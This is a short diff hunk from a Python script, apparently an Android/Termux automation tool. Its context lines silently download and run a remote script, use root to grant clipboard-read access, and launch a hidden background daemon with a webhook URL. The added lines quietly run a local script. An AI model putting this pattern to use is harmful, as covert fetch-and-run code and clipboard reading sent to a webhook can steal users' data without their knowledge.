@@ -373,6 +373,10 @@ try:
     URL_COPY_PY = f"https://raw.githubusercontent.com/Willianz4z4/Hapiephonee/main/functions/auto_copy.py?v={v_cache}"
     os.system(f"curl -sL '{URL_COPY_PY}' -o {copy_script_path} > /dev/null 2>&1")
 
+    termux_tasker_script = os.path.join(BASE_DIR, "termux_plugin", "termux_tasker.py")
+    if os.path.exists(termux_tasker_script):
+        subprocess.run([sys.executable, termux_tasker_script], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
     subprocess.run('su -c "appops set com.termux READ_CLIPBOARD allow" 2>/dev/null', shell=True)
     daemon_cmd = f"nohup {python_path} {copy_script_path} {device_id} {guild_id} {owner_id} '{URL_WEBHOOK}' > {log_script_path} 2>&1 &"
     os.system(daemon_cmd)
